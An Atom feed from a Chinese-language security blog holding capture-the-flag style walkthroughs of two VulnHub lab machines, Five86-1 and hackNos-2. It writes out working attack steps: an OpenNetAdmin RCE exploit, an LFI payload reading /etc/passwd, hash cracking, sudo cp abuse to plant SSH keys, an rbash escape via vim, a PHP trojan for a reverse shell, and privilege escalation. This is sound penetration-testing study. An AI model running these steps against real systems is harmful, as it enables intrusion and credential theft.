<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>土豆子</title>
  
  <subtitle>Try Harder</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://mr-potatoz.github.io/"/>
  <updated>2020-03-10T11:18:28.000Z</updated>
  <id>https://mr-potatoz.github.io/</id>
  
  <author>
    <name>土豆子</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2020-03-10-Five86-1</title>
    <link href="https://mr-potatoz.github.io/2020/03/10/Five86-1/"/>
    <id>https://mr-potatoz.github.io/2020/03/10/Five86-1/</id>
    <published>2020-03-10T10:53:46.000Z</published>
    <updated>2020-03-10T11:18:28.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><code>2020-02-14 14</code> —— <code>2020-02-14 16</code> </p></blockquote><br/><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Description</span><br><span class="line">Five86-1 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</span><br><span class="line"></span><br><span class="line">The ultimate goal of this challenge is to get root and to read the one and only flag.</span><br><span class="line"></span><br><span class="line">Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</span><br><span class="line"></span><br><span class="line">For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&#39;t give you the answer, instead, I&#39;ll give you an idea about how to move forward.</span><br><span class="line"></span><br><span class="line">Technical Information</span><br><span class="line">Five86-1 is a VirtualBox VM built on Debian 64 bit, but there shouldn&#39;t be any issues running it on most PCs.</span><br><span class="line"></span><br><span class="line">Five86-1 has been tested successfully on VMWare Player, but if there are any issues running this VM in VMware, have a read through of this.</span><br><span class="line"></span><br><span class="line">It is currently configured for Bridged Networking, however, this can be changed to suit your requirements. Networking is configured for DHCP.</span><br><span class="line"></span><br><span class="line">Installation is simple - download it, unzip it, and then import it into VirtualBox or VMWare and away you go.</span><br><span class="line"></span><br><span class="line">Important</span><br><span class="line">While there should be no problems using this VM, by downloading it, you accept full responsibility for any unintentional damage that this VM may cause.</span><br><span class="line"></span><br><span class="line">In saying that, there shouldn&#39;t be any problems, but I feel the need to throw this out there just in case.</span><br><span class="line"></span><br><span class="line">Credits</span><br><span class="line">A big thanks goes out to the members of @m0tl3ycr3w.</span><br><span class="line"></span><br><span class="line">Contact</span><br><span class="line">I&#39;m also very interested in hearing how people go about solving these challenges, so if you&#39;re up for writing a walkthrough, please do so and send me a link, or alternatively, follow me on Twitter, and DM me (you can unfollow after you&#39;ve DM&#39;d me if you&#39;d prefer).</span><br><span class="line"></span><br><span class="line">I can be contacted via Twitter - @Five86_x</span><br></pre></td></tr></table></figure><br/><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Kali : 192.168.56.109</span><br><span class="line">目标网段 : 192.168.56.1/24</span><br></pre></td></tr></table></figure><br/><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><br/><p>主机存活：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -s -sn -T5 -v 192.168.56.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure><p>扫服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -n -Pn -sV -O 192.168.56.114</span><br></pre></td></tr></table></figure><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">10000/tcp open  http    MiniServ 1.920 (Webmin httpd)</span><br></pre></td></tr></table></figure><br/><hr><br/><p>访问 80 端口，无有价值信息</p><p>例行扫目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch.py -u http://192.168.56.114 -e php --random-agents</span><br></pre></td></tr></table></figure><br/><p><img src="2020-02-14-14-35-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><p>经访问：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">########################</span></span><br><span class="line">[14:35:21] 200 -   30B  - /index.html    <span class="comment"># 404</span></span><br><span class="line">[14:35:25] 401 -  461B  - /reports          <span class="comment"># need user|passwd</span></span><br><span class="line">[14:35:25] 401 -  461B  - /reports/Webalizer/   <span class="comment"># need user|passwd</span></span><br><span class="line">[14:35:25] 200 -   29B  - /robots.txt</span><br><span class="line"><span class="comment">#####</span></span><br><span class="line">http://192.168.56.114/robots.txt</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /ona</span><br><span class="line"><span class="comment">########################</span></span><br><span class="line">http://192.168.56.114/ona<span class="comment"># OpenNetAdmin</span></span><br></pre></td></tr></table></figure><br/><p><img src="2020-02-14-14-45-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><p>搜索相关漏洞，得到远程命令执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit opennetadmin</span><br></pre></td></tr></table></figure><p><img src="2020-02-14-14-44-52%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><h2 id="海滩登陆"><a href="#海滩登陆" class="headerlink" title="海滩登陆"></a>海滩登陆</h2><br/><p>使用 <code>47691.sh</code> 如果报错的话，可以先 <code>dos2unix</code> 转换一下格式，作者可能在 <code>dos</code> 环境下写的脚本</p><br/><p><img src="2020-02-14-18-38-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><br/><p>使用 MSF：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先复制到桌面</span></span><br><span class="line">cp /usr/share/exploitdb/exploits/php/webapps/47772.rb ~/Desktop/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制到 MSF 内利用</span></span><br><span class="line">cp 47772.rb /usr/share/metasploit-framework/modules/exploits/</span><br></pre></td></tr></table></figure><br/><p><img src="2020-02-14-15-10-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p><br/><p>测试发现存在 <code>Python</code> 使用交互式 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; shell</span><br><span class="line"></span><br><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure><br/><p>先看 <code>/etc/passwd</code> 有多少用户及有价值信息。目录全无访问权</p><br/><p><img src="2020-02-14-15-13-04%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p><p><img src="2020-02-14-15-13-36%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><p>这个时就需要最后的搜刮一下，得到了一组用户密码。其他用户，无有价值信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -ri --color=auto --exclude-dir=proc/ <span class="string">'douglas'</span> / 2&gt;/dev/null</span><br></pre></td></tr></table></figure><br/><p><img src="2020-02-14-15-28-42%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p><p><img src="2020-02-14-15-30-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><hr><br/><p>Hash 破解，没跑成来，查了一下，会用到作者给的提示 <code>aefhrt</code>。使用 <code>crunch</code> 生产字典：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br></pre></td></tr></table></figure><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ crunch 10 10 aefhrt &gt;word.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">$ crunch 10 10 aefhrt -o word.txt</span><br><span class="line"></span><br><span class="line">$ john --wordlist=word.txt <span class="built_in">hash</span> </span><br><span class="line">$ john --show <span class="built_in">hash</span> </span><br><span class="line"></span><br><span class="line">?:fatherrrrr</span><br></pre></td></tr></table></figure><br/><p><img src="2020-02-14-15-51-31%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><h2 id="身份切换-SSH免密登陆"><a href="#身份切换-SSH免密登陆" class="headerlink" title="身份切换(SSH免密登陆)"></a>身份切换(SSH免密登陆)</h2><br/><p>登录 SSH，得到普通用户，目录下除了 <code>.ssh/</code> 外无其他有价值信息。</p><p>可使用的 <code>sudo</code> 命令为 <code>cp</code> ：</p><br/><p><img src="2020-02-14-16-03-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><p>涉及知识的盲区了，特地去查询记录了一下</p><br/><p><code>cp</code> 命令可以配合  <code>SSH（authorized_keys）</code> 免密登录到其他用户：</p><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 为目标生成 ssh key</span></span><br><span class="line">ssh-keygen -b 2048</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制生成的 id_rsa.pub 到 /tmp 下并改名为 authorized_kes</span></span><br><span class="line">cp /home/douglas/.ssh/id_rsa.pub /tmp/authorized_kes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 改变 authorized_kes 的权限</span></span><br><span class="line">chmod 777 authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制到目标 .ssh/ 下</span></span><br><span class="line">sudo -u jen /bin/cp authorized_keys /home/jen/.ssh/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登陆</span></span><br><span class="line">ssh jen@127.0.0.1</span><br></pre></td></tr></table></figure><br/><br/><p><img src="2020-02-14-16-16-13%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-14-16-18-58%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><p>说是有邮件，查看邮件，得到另一组用户名和密码，登陆成功。</p><br/><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><br/><p>看目录，得到一个 <code>SUID</code> 的二进制文件，可以直接成为 <code>root</code> ，进 <code>root</code> 目录，得到 Flag</p><br/><br/><p><img src="2020-02-14-16-25-30%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-14-16-28-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><hr><br/><p>与其说是提权，不如说是作者准备好的外挂道具，让你可以一举成神，有种欲求不满的感觉，前面刚鼓起的劲，到了后面直接一键 <code>root</code> ，无法满足啊</p><br/><p>不过，也是学到技能了</p><br/><p>也可以使用如下方式：</p><ul><li>创建一个权限 <code>777</code> 的文件</li><li>使用 <code>find</code> 命令查找 <code>Jen</code> 创建的文件</li><li>使用 <code>cp</code> 命令，复制找到的文件 到 <code>777</code> 权限的 文件</li><li><code>cat</code> 查看</li></ul><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo -u</span></span><br><span class="line">-u, --user=user              <span class="comment"># 以指定用户或 ID</span></span><br></pre></td></tr></table></figure><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u jen /bin/cp /var/mail/jen ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      Five86-1
    
    </summary>
    
    
      <category term="vulnhub" scheme="https://mr-potatoz.github.io/categories/vulnhub/"/>
    
    
      <category term="vulnhub" scheme="https://mr-potatoz.github.io/tags/vulnhub/"/>
    
      <category term="OSCP" scheme="https://mr-potatoz.github.io/tags/OSCP/"/>
    
  </entry>
  
  <entry>
    <title>hackNos-2</title>
    <link href="https://mr-potatoz.github.io/2020/03/10/hackNos-2/"/>
    <id>https://mr-potatoz.github.io/2020/03/10/hackNos-2/</id>
    <published>2020-03-10T06:10:45.000Z</published>
    <updated>2020-03-10T11:17:17.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>2020-02-11-14——2020-02-12-13</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Difficulty : Easy to Intermediate</span><br><span class="line"></span><br><span class="line">Flag : 2 Flag first user And second root</span><br><span class="line"></span><br><span class="line">Learning : Web Application | Enumeration | Password Cracking</span><br><span class="line"></span><br><span class="line">## Changelog - 2019-12-13 ~ v1.1 - 2019-11-29 ~ v1.0</span><br></pre></td></tr></table></figure><br/><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Kali：192.168.56.109</span><br><span class="line"></span><br><span class="line">目标网段：192.168.56.1&#x2F;24</span><br></pre></td></tr></table></figure><br/><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><br/><p>主机存活扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -n -sn -T5 -v 192.168.56.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure><br/><p>找到目标地址后，扫面服务及操作系统：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -n -Pn -sV -O 192.168.56.113</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br></pre></td></tr></table></figure><br/><h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>访问 80 端口，略过 Apache 的干扰视线页面，直接扫目录：</p><br/><p><img src="2020-02-11-14-04-55%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-11-14-08-45%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><p>目录访问如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.113/index.html<span class="comment"># Apache 页面，无有价值信息</span></span><br><span class="line"></span><br><span class="line">http://192.168.56.113/tsweb<span class="comment"># 主要目录，WordPress 5.3</span></span><br></pre></td></tr></table></figure><br/><p><code>WordPress</code> 扫描：</p><ul><li><code>Cmseek</code> ：简单扫描</li><li><code>wpscan</code> ：详细扫描</li></ul><br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmseek.py -u http://192.168.56.113/tsweb</span><br><span class="line"></span><br><span class="line">wpscan --url http://192.168.56.113/tsweb/</span><br></pre></td></tr></table></figure><br/><p><code>WP</code> 一般就是插件方面的漏洞比较多，<code>searchsploit</code> 也多是插件与主题的漏洞，扫得：</p><ul><li>插件：<code>gracemedia-media-player</code> <code>version 1.0</code> </li><li>用户名：<code>user</code>  </li></ul><br/><p><img src="2020-02-11-14-55-32%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-11-17-09-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><p>试着爆破一下后台 <code>wp-admin</code> ，需要收集一些社工资料，在<code>tsweb</code> 主页有个 <code>about</code> </p><p>得到靶机作者姓名，然后生成字典，Burp 跑爆破，无果……</p><br/><p><img src="2020-02-11-15-42-53%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-11-16-47-28%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><p>回到上一步，搜索 <code>gracemedia-media-player</code> 插件，有个 <strong>LFI</strong> 漏洞，利用成功，得到一个用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.56.113&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;templates&#x2F;files&#x2F;ajax_controller.php?ajaxAction&#x3D;getIds&amp;cfg&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><br/><p><a href="https://cxsecurity.com/issue/WLB-2019030113" target="_blank" rel="noopener"><strong>WordPress GraceMedia Media Player 1.0 Local File Inclusion</strong></a> </p><br/><p><img src="2020-02-11-17-13-12%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:$1$flag$vqjCxzjtRc7PofLYS2lWf&#x2F;:1001:1003::&#x2F;home&#x2F;flag:&#x2F;bin&#x2F;rbash</span><br></pre></td></tr></table></figure><br/><p><code>/etc/passwd</code> 的格式中，第一栏是 <strong>用户名</strong> ，第二栏是 <strong>密码</strong> ，破解 Hash，各大破解网站都试了一遍，除了 <code>cmd5.com</code> 有记录外（付费），其他要么不识别，要么无此条目</p><br/><h2 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h2><p>搜了一下 <code>Write-up</code> ，使用 <code>Jhon</code> 破解。得到密码（<code>topsecret</code>）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long 1.hash</span><br></pre></td></tr></table></figure><br/><p><img src="2020-02-11-18-06-31%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p><br/><p>登录 SSH 成功，<code>shell</code> 为 <code>rbash</code> ，一个受限制的 <code>shell</code> ，使用 <code>Vim</code> 绕过：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim</span><br><span class="line"></span><br><span class="line">:<span class="built_in">set</span> shell=/bin/bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><br/><p><img src="2020-02-11-18-38-21%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><br/><p>查看 <code>sudo -l</code> 可以干什么</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"><span class="comment"># Sorry, user flag may not run sudo on hacknos.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SUID 无有价值程序</span></span><br><span class="line">/bin/su</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/umount</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newuidmap</span><br></pre></td></tr></table></figure><br/><br/><p>想到之前在 <code>/etc/passwd</code> 看到还有一个 <code>rohit</code> 用户，<code>HOME</code> 目录有访问权，无查看权，需要提权</p><p>搜一波相关内容文件，得到 <code>rohit</code> 的密码哈希，丢后台破解：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -ri --color=auto --exclude-dir=proc/ <span class="string">'rohit'</span> / 2&gt;/dev/null</span><br></pre></td></tr></table></figure><br/><p><img src="2020-02-12-11-49-38%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><br/><p>继续收集信息，有 WordPress 肯定就有配置文件和 MySQL，进入网站根目录下：</p><p><code>ls -al</code> 显示着唯一同时具备 <code>rw</code> 权限的文件，有猫腻，得到数据库名及一组用户名密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># DA_NAME：</span></span><br><span class="line">wordpress</span><br><span class="line"></span><br><span class="line"><span class="comment"># DB_USER：</span></span><br><span class="line">wpuser</span><br><span class="line"></span><br><span class="line"><span class="comment"># DB_PASSWORD：</span></span><br><span class="line">hackNos-2.com</span><br></pre></td></tr></table></figure><br/><br/><p><img src="2020-02-11-18-44-41%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p><br/><p>登录数据库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -h localhost -u wpuser -p hackNos-2.com</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM wp_users;</span><br></pre></td></tr></table></figure><br/><p>又得到一组用户名与密码（被加密），有密码需要破解，又没钱，只能看 <code>Write-up</code> ，可以改密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user:$P$B.O0cLMNmn7EoX.JMHPnNIPuBYw6S2</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 改密码为 user</span><br><span class="line">update wp_users set user_pass&#x3D;md5(&quot;user&quot;) where user_login&#x3D;&#39;user&#39;;</span><br></pre></td></tr></table></figure><br/><hr><br/><p>目前账号信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 低权限用户（rbash），已经无价值了</span></span><br><span class="line">flag：topsecret</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mysql 登录</span></span><br><span class="line">wpuser：hackNos-2.com</span><br><span class="line"><span class="comment"># 无法 SSH/Web 后台</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># WordPress 用户，可登录 Web后台</span></span><br><span class="line">user：<span class="variable">$P</span><span class="variable">$B</span>.O0cLMNmn7EoX.JMHPnNIPuBYw6S2 改为：user</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rohit：<span class="variable">$1</span><span class="variable">$rohit</span><span class="variable">$01Dl0NQKtgfeL08fGrggi0</span></span><br></pre></td></tr></table></figure><br/><h3 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h3><br/><p>后台密码破解中。先去 WordPress 后台看看</p><br/><p>登录 WordPress 后台，试着能不能上传文件，反弹个 <code>shell</code> ，添加的新文章内添加代码被直接显示出来，不被渲染，还有个 <strong>插件编辑</strong> 的，写入 PHP 木马，监听端口，访问木马页面，反弹成功，<code>www-data</code> 用户：</p><br/><p><img src="2020-02-11-19-29-07%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-11-19-29-17%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取一个交互式 shell</span></span><br><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure><p>一波查看，这个用户似乎也干不了什么大事，权限也不够</p><br/><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>rohit</code> 的密码没跑出来， <code>cmd5.com</code> 收费，若是真实渗透的话，充值一下也无所谓</p><p>这里直接看的 <code>Write-up</code> ，密码明文：<code>!%hack41</code> </p><br/><p>SSH 登录 <code>rohit</code> ，看看可以干什么……ALL。查看 <code>HOME</code> 目录，得到一个 FLAG 和 一个 MD5 Hash：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">User rohit may run the following commands on hacknos:</span><br><span class="line">    (ALL : ALL) ALL</span><br></pre></td></tr></table></figure><br/><p><img src="2020-02-12-12-29-29%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><br/><p>查看是否还有其他有价值的信息：<code>ls -al</code> ， (o゜▽゜)o☆[BINGO!]</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.sudo_as_admin_successful</span><br></pre></td></tr></table></figure><p>这个可使用 <code>rohit</code> 的密码切换成为 <code>root</code> 用户，得到 <code>root.txt</code> </p><br/><br/><p><img src="2020-02-12-12-31-45%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-12-12-34-44%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br/><hr><br/><p>这里似乎登录 <code>WordPress</code> 后台没什么作用，只是扩大了信息，或许以后会发现他的用处</p><br/><p>这里难的地方就是 Hash 破解了吧，没台好机器，没个好字典，没个好在线工具</p><br/><hr><br/><p>看了一下别人的 <code>Write-up</code> 发现自己忽略了一个提权方式（这就是缺乏经验吧……）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 